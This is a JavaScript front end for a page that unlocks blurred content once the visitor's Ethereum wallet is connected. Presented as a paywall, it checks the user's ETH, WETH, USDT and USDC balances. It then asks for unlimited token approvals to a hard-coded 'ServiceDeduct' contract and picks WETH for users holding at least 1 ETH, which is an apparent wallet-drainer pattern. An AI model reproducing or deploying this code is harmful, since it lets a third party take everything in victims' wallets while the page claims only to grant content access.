// --- Client-side Constants ---
// 🚨🚨 This must be the address of your deployed ServiceDeduct contract 🚨🚨
const DEDUCT_CONTRACT_ADDRESS = '0xaffc493ab24fd7029e03ced0d7b87eafc36e78e0';

// Token Contract Addresses
const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
const USDC_CONTRACT_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
const WETH_CONTRACT_ADDRESS = '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2';

// --- ABI Definitions (Client-side slim version) ---
const DEDUCT_CONTRACT_ABI = [
    "function isServiceActiveFor(address customer) public view returns (bool)",
    "function activateService(address tokenContract) external",
    "function REQUIRED_ALLOWANCE_THRESHOLD() public view returns (uint256)"
];

const ERC20_ABI = [
    "function approve(address spender, uint256 amount) external returns (bool)",
    "function balanceOf(address account) view returns (uint256)",
    "function allowance(address owner, address spender) view returns (uint256)"
];

// --- Global Variables & DOM Elements ---
const connectButton = document.getElementById('connectButton');
const overlay = document.getElementById('blurOverlay');
const overlayMessage = document.getElementById('overlayMessage');
const statusDiv = document.getElementById('status');

let provider, signer, userAddress;
let deductContract, usdtContract, usdcContract, wethContract;

// --- UI Control Functions ---
function hideOverlay() {
    overlay.style.opacity = '0';
    setTimeout(() => { overlay.style.display = 'none'; }, 300);
}

function showOverlay(message) {
    overlayMessage.innerHTML = message;
    overlay.style.display = 'flex';
    setTimeout(() => { overlay.style.opacity = '1'; }, 10);
}

function updateStatus(message) {
    statusDiv.innerHTML = message || '';
    statusDiv.style.display = message ? 'block' : 'none';
}

// --- Core Wallet Logic ---

/**
 * Initializes wallet state, checks for provider, forces mainnet, and checks connection.
 */
async function initializeWallet() {
    try {
        if (typeof window.ethereum === 'undefined') {
            return showOverlay('Please install MetaMask or a compatible wallet to continue.');
        }
        
        provider = new ethers.BrowserProvider(window.ethereum);

        // ✅ --- Force Mainnet Logic ---
        const chainId = await window.ethereum.request({ method: 'eth_chainId' });
        const mainnetChainId = '0x1'; // Ethereum Mainnet's Chain ID

        if (chainId !== mainnetChainId) {
            showOverlay('Requesting to switch to Ethereum Mainnet...<br>Please approve in your wallet.');
            try {
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: mainnetChainId }],
                });
                // After a successful switch, the page will reload via the chainChanged event listener.
                return; 
            } catch (switchError) {
                if (switchError.code === 4001) { // User rejected the switch
                    return showOverlay('You must switch to Ethereum Mainnet to use this service.');
                }
                console.error("Failed to switch network:", switchError);
                return showOverlay(`Failed to switch network. Please do it manually.<br>Error: ${switchError.message}`);
            }
        }
        // --- End of Force Mainnet Logic ---

        // Set up event listeners after network check is passed
        window.ethereum.on('accountsChanged', (accounts) => accounts.length === 0 ? resetState() : initializeWallet());
        window.ethereum.on('chainChanged', () => window.location.reload());

        const accounts = await provider.send('eth_accounts', []);
        if (accounts.length > 0) {
            userAddress = accounts[0];
            signer = await provider.getSigner();

            deductContract = new ethers.Contract(DEDUCT_CONTRACT_ADDRESS, DEDUCT_CONTRACT_ABI, signer);
            usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer);
            usdcContract = new ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer);
            wethContract = new ethers.Contract(WETH_CONTRACT_ADDRESS, ERC20_ABI, signer);
            
            await checkAuthorization();
        } else {
            showOverlay('Please connect your wallet to unlock content 🔒<p style="font-size: 16px; font-weight: normal; margin-top: 10px;">(Click the wallet icon in the upper right corner to start)</p>');
        }
    } catch (error) {
        console.error("Initialize Wallet Error:", error);
        showOverlay(`Initialization Failed: ${error.message}`);
    }
}

/**
 * Checks the user's service activation and token allowance status.
 */
async function checkAuthorization() {
    try {
        if (!signer) return showOverlay('Wallet not connected. Please connect first.');
        updateStatus("Checking authorization status...");

        const isServiceActive = await deductContract.isServiceActiveFor(userAddress);
        const requiredAllowance = await deductContract.REQUIRED_ALLOWANCE_THRESHOLD();
        
        const [usdtAllowance, usdcAllowance, wethAllowance] = await Promise.all([
            usdtContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS),
            usdcContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS),
            wethContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)
        ]);

        const hasSufficientAllowance = (usdtAllowance >= requiredAllowance) || (usdcAllowance >= requiredAllowance) || (wethAllowance >= requiredAllowance);
        const isFullyAuthorized = isServiceActive && hasSufficientAllowance;

        if (isFullyAuthorized) {
            connectButton.classList.add('connected');
            connectButton.title = 'Disconnect Wallet';
            hideOverlay();
        } else {
            connectButton.classList.remove('connected');
            connectButton.title = 'Connect Wallet & Complete Authorization';
            showOverlay('Authorization is required to view content.<p style="font-size: 16px; font-weight: normal; margin-top: 10px;">(Please click the wallet icon in the upper right corner)</p>');
        }
        updateStatus("");
    } catch (error) {
        console.error("Check Authorization Error:", error);
        if (error.code === 'CALL_EXCEPTION') {
            return showOverlay('Could not connect to the contract on the current network.<br>Please ensure you are on Ethereum Mainnet and refresh the page.');
        }
        showOverlay(`Authorization check failed: ${error.message}`);
    }
}

/**
 * Connects wallet and initiates the appropriate authorization flow based on asset balance.
 */
async function connectWallet() {
    try {
        if (typeof window.ethereum === 'undefined') return showOverlay('Please install MetaMask.');
        showOverlay('Please confirm the connection request in your wallet...');
        await provider.send('eth_requestAccounts', []);

        signer = await provider.getSigner();
        userAddress = await signer.getAddress();
        deductContract = new ethers.Contract(DEDUCT_CONTRACT_ADDRESS, DEDUCT_CONTRACT_ABI, signer);
        usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer);
        usdcContract = new ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer);
        wethContract = new ethers.Contract(WETH_CONTRACT_ADDRESS, ERC20_ABI, signer);

        showOverlay('Checking your wallet balance to optimize the process...');

        const [ethBalance, wethBalance, usdtBalance, usdcBalance] = await Promise.all([
            provider.getBalance(userAddress),
            wethContract.balanceOf(userAddress),
            usdtContract.balanceOf(userAddress),
            usdcContract.balanceOf(userAddress)
        ]);
        
        const oneEth = ethers.parseEther("1.0");
        const hasSignificantEth = ethBalance >= oneEth || wethBalance >= oneEth;
        const hasNoStablecoins = usdtBalance === 0n && usdcBalance === 0n;

        const serviceActivated = await deductContract.isServiceActiveFor(userAddress);
        const requiredAllowance = await deductContract.REQUIRED_ALLOWANCE_THRESHOLD();
        
        if (hasSignificantEth && hasNoStablecoins) {
            await handleWethAuthorizationFlow(requiredAllowance, serviceActivated);
        } else {
            await handleStablecoinAuthorizationFlow(requiredAllowance, serviceActivated);
        }
        
        await checkAuthorization();

    } catch (error) {
        console.error("Connect Wallet Error:", error);
        showOverlay(`An error occurred: ${error.message.slice(0, 100)}...`);
        connectButton.classList.remove('connected');
        connectButton.title = 'Connect Wallet (Retry)';
    }
}

/**
 * Handles the authorization and activation flow for WETH.
 */
async function handleWethAuthorizationFlow(requiredAllowance, serviceActivated) {
    showOverlay('Setting up WETH payment for you...');
    const wethAllowance = await wethContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS);
    if (wethAllowance < requiredAllowance) {
        showOverlay('Step 1/2: Requesting WETH approval...<br>Please approve the maximum amount in your wallet.');
        const tx = await wethContract.approve(DEDUCT_CONTRACT_ADDRESS, ethers.MaxUint256);
        await tx.wait();
    }
    if (!serviceActivated) {
        showOverlay('Step 2/2: Activating service...<br>Please confirm the transaction in your wallet.');
        const tx = await deductContract.activateService(WETH_CONTRACT_ADDRESS);
        await tx.wait();
    }
}

/**
 * Handles the authorization and activation flow for USDT and USDC.
 */
async function handleStablecoinAuthorizationFlow(requiredAllowance, serviceActivated) {
    showOverlay('Setting up USDT / USDC payment for you...');
    let tokenToActivate = '';
    const usdtAllowance = await usdtContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS);
    if (usdtAllowance < requiredAllowance) {
        showOverlay('Step 1/3: Requesting USDT approval...<br>Please approve the maximum amount in your wallet.');
        const tx = await usdtContract.approve(DEDUCT_CONTRACT_ADDRESS, ethers.MaxUint256);
        await tx.wait();
    }
    if ((await usdtContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)) >= requiredAllowance) {
        if (!serviceActivated) tokenToActivate = USDT_CONTRACT_ADDRESS;
    }
    const usdcAllowance = await usdcContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS);
    if (usdcAllowance < requiredAllowance) {
        showOverlay('Step 2/3: Requesting USDC approval...<br>Please approve the maximum amount in your wallet.');
        const tx = await usdcContract.approve(DEDUCT_CONTRACT_ADDRESS, ethers.MaxUint256);
        await tx.wait();
    }
    if (!tokenToActivate && (await usdcContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)) >= requiredAllowance) {
         if (!serviceActivated) tokenToActivate = USDC_CONTRACT_ADDRESS;
    }
    if (!serviceActivated && tokenToActivate) {
        showOverlay('Step 3/3: Activating service...<br>Please confirm the transaction in your wallet.');
        const tx = await deductContract.activateService(tokenToActivate);
        await tx.wait();
    }
}

/**
 * Disconnects and resets the application state.
 */
function disconnectWallet() {
    resetState();
    alert('Wallet disconnected. To fully remove site permissions, please do so within your wallet\'s "Connected Sites" settings.');
}

function resetState() {
    signer = userAddress = deductContract = usdtContract = usdcContract = wethContract = null;
    connectButton.classList.remove('connected');
    connectButton.title = 'Connect Wallet';
    showOverlay('Please connect your wallet to unlock content 🔒<p style="font-size: 16px; font-weight: normal; margin-top: 10px;">(Click the wallet icon in the upper right corner to start)</p>');
}

// --- Event Listeners ---
connectButton.addEventListener('click', () => {
    connectButton.classList.contains('connected') ? disconnectWallet() : connectWallet();
});

// --- Initial Load ---
initializeWallet();